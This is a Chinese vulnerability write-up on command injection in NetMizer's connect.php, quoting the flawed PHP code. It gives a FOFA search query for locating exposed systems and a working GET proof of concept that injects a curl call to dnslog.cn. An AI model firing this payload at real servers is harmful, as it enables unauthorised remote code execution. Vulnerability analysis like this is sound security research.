---
title: "NetMizer日志管理系统 connect.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-manage-connect-start-ifname-rce.html
asset_dir: assets/netmizer日志管理系统-connect.php-命令执行漏洞
---

# NetMizer日志管理系统 connect.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/14 08:25
- 1087浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

SQL注入检测工具

编码转换工具

VPN服务

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/manage/connect.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞修复方案

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

安全认证考试

网络安全会议

安全运维咨询

看下 `connect.php` 业务实现关键逻辑部分

```
if($action == "start"){
    $name_gbk = mb_check_encoding($name, 'UTF-8') ? mb_convert_encoding($name, 'gbk', 'UTF-8') : $name;
    $argu = array("ok"=>0);
    setconfig($name_gbk, $argu);
    $file = "/tmp/$name_gbk.pcap";
    $cmd = "/usr/sbin/tcpdump -n -i $ifname src host $device and port $port > $file &";
    $f = popen($cmd,"r");
    if($f != NULL){
            sleep(5);
            $cmd = "/bin/ps aux | grep $ifname | grep $device | grep $port | awk '{print $2}'";
            $arr = array();
            exec($cmd,$arr);
            $pid = $arr[0];
            shell_exec(`kill $pid`);
    }
    pclose($f);
    $cmd = "cat $file | wc -l";
    $arr = array();
    exec($cmd,$arr);
    $total_pkt = $arr[0];
    $cmd = "cat $file | awk -F'length ' '{print $2}'";
    $arr = array();
    exec($cmd,$arr);
    $total_bytes = 0;
    for($i = 0; $i < count($arr); $i ++){
            $total_bytes += intval($arr[$i]);
    }
    $now = time();
    $argu = array("pkt"=>round($total_pkt/5, 2), "total_pkt"=>$total_pkt, "total_bytes"=>$total_bytes, "bytes"=>round($total_bytes/5, 2), "create_time"=>$now, "ok"=>1);
    setconfig($name_gbk, $argu);
    echo '{"success":true}';

    return;
}
```

在 `if($action == "start")` 部分，构建的 `$cmd` 字符串直接使用用户输入的 `$ifname`、`$device` 和 `$port` 变量执行系统命令（如 `tcpdump` 和 `ps`、`kill`）。这些变量未经过转义或过滤就直接拼接进命令字符串中，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/manage/connect.php?action=start&device=192.168.1.1&ifname=;curl+`whoami`.dnslog.cn+%23+&name=test&port=88 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 `curl` 命令并在DNSLOG平台得到执行结果

[![NetMizer日志管理系统 connect.php 命令执行漏洞](images/img-001-07f80097607f.webp)](https://image.mrxn.net/39e38810a0c44dd7b89db2cbaebb942d.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

安全工具开发
